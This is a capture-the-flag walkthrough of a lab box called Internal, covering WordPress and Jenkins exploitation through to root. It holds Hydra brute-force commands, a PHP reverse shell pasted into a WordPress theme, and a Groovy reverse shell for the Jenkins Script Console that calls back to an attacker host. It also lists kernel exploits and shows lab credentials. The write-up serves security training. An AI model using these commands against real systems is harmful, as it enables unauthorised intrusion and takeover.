# Internal CTF

## Scope of Work

The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

User.txt
Root.txt
Additionally, the client has provided the following scope allowances:

Ensure that you modify your hosts file to reflect internal.thm
Any tools or techniques are permitted in this engagement
Locate and note all vulnerabilities found
Submit the flags discovered to the dashboard
Only the IP address assigned to your machine is in scope

### configure /etc/hosts

![](images/etchosts.png)

### nmap

![](images/nmap1.png)

Found 2 open ports: 22 and 80.

### ssh enum

OpenSSH 7.6 is vulnerable to username enumeration. Metasploit has a module for this. I found [this post on the module](https://github.com/rapid7/metasploit-framework/issues/15676) very useful.

I let this run in the background.

![](images/ssh1.png)


### website enum

The webpage is a basic apache2 default page.

![](images/apache.png)

There is very little to work with, so I run Gobuster to find other directories that are available.

![](images/gobuster.png)


I then investigate the newly discovered directories.


- blog

![/blog](images/blog.png) 
This is a nice looking wordpress site.

It has a search bar.

In the bottom of `/blog`, there is a section called meta.

![](images/meta.png)

This gives us access to a number of things. The first is a wordpress login page.

![](images/wplogin.png)

We can also download files that gives us a comment feed and an rss feed.

![comment feed](images/commentfeed.png)

![rss feed](images/rssfeed.png)

Wordpress is running on version `5.4.2`

There is also a "hello world" blog post. This post has a comment field.

![](images/helloworld.png)


- wordpress

This one can't be found...

![](images/wordpress.png)


- javascript

This page is forbidden.

![](images/javascript.png)


- phpmyadmin

Here I found another login page.

![](images/phpmyadmin.png)


http://10.10.11.236/blog/wp-admin/ redirects to `/wp-login.php`.




### getting into wordpress

By default, wordpress will give different error messages depending on if the username supplied is correct or not. Below is the message that appears when our username and password is incorrect.

![General error message](images/general-wp-error.png)

Below is the result of when I input the username "admin":

![](images/pw_for_user_incorrect.png) 

This confirms a valid username. 


![](images/http_login.png)

Investigating the HTTP request that was sent, I constructed a Hydra command.

`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.11.236 http-post-form "/blog/wp-login.php:log=^USER^&pwd=^PASS^:incorrect"`

![](images/hydra_wp.png)

I found the password `my2boys`.


After logging in, I saw an unpublished blog post that contained the following:
![](images/honeypot.png)

I attempted to log into SSH with these credentials, but unsuccessfully. In the [previous room](https://github.com/substing/relevant_ctf) by the same creator, I was distracted by fake credentials and wasted a lot of my time trying to use them. After one attempt, I just moved on and focused on getting a shell.

### getting a shell

The next step was for me to get access to the system directly. I did this by uploading a [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) into the [wordpress site](http://internal.thm/blog/wp-admin/theme-editor.php?file=404.php&theme=twentyseventeen).

![](images/editing_shell.png)

Upload is not completely accurate, it was actually pasted into a WordPress theme.

After starting a listener, I navigated to the webpage which contained the php script to activate my shell: http://10.10.11.236/blog/wp-content/themes/twentyseventeen/404.php

My listener successfully opened a shell on the target system.

![](images/listener.png)

### privilege escalation to a user

```
www-data@internal:/home$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
```
My user was www-data, but I wanted to switch to a normal user. There was a user named "aubreanna".

I attempted to switch to `aubreanna` by using the `arnold147` and `my2boys`, hoping that perhaps there were reused passwords, but with no success.

I ran [linpeas](https://www.kali.org/tools/peass-ng/) to help check for privilege escalation vectors, but didn't find anything valuable.

![](linpeas.png)

There were a number of vulnerabilities that could be exploited, but there was no compiler that I could find, and all the exploits I looked into required me to compile a C program.
```
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2018-18955] subuid_shell

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled


[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.

```

I ran `ls / *` to just begin looking through all files on the system, and within `/opt/wp-save.txt` I found the following:

![The file contents.](images/wp-savetxt.png)

```
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

These credentials were valid for logging into SSH!

![](images/ssh.png)

I immediately wanted to check if the system was vulnerable to CVE-2019-14287. It wasn't.

![](images/sudo_check.png)

Moreover this user cannot run sudo, so the `sudo -l` strategy was not possible.

### privilege escalation to root

In the user's home directory, there was a file called `jenkins.txt` which gave information about a jenkins service running in a docker container (if I understand the deployment correctly).

![](images/jenkinstxt.png)

Then I checked to make sure it was actually running:

![](images/netstat.png)

The way I used to gain access, and to my knowledge, the only way to gain access to a service deployed this way is by use of SSH tunneling. The screenshot below shows me establishing an SSH tunnel.

![](images/ssh_tunnel.png)

At this point I had gained access to Jenkins, and now needed to bypass the login. 

![](images/jenkinslogin.png)

I got past this by using the developer tools in FireFox to see what login HTTP requests looked like. Using this, I was able to construct a Hydra command to brute force the page.

`hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password"`

![](images/jenkinsbrute.png)

The site was running Jenkins 2.250.

On the site, I had access to Script Console, which allowed me to run some system commands. 
![](images/sc_example.png)

Clearly, this was another opportunity to gain a shell on this Docker instance.

I looked up reverse shells for Jenkins Script Console, and found [this one](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76). It is written to execute on windows systems (and of course I need to change the callback host), so the final modified script is shown below.

```
String host="10.10.112.24";
int port=8044;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Just as before I opened a listener before executing the reverse shell.
![](images/listener2.png)

Probably one of my greatest lessons from this challenge is that there is no harm in checking the contents of the file in the `/` directory, thus I ran `ls *` again. A file called `note.txt`.

```
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```

I attempted to use this to gain root on the Docker container, but it didn't work. I then attempted to escalate on the main box, and it worked!

![](images/getroot.png)


## Closing notes

Under no circumstances should you store credentials in plaintext files, and if you do, make them deeply buried away in the shadows of some configuration file.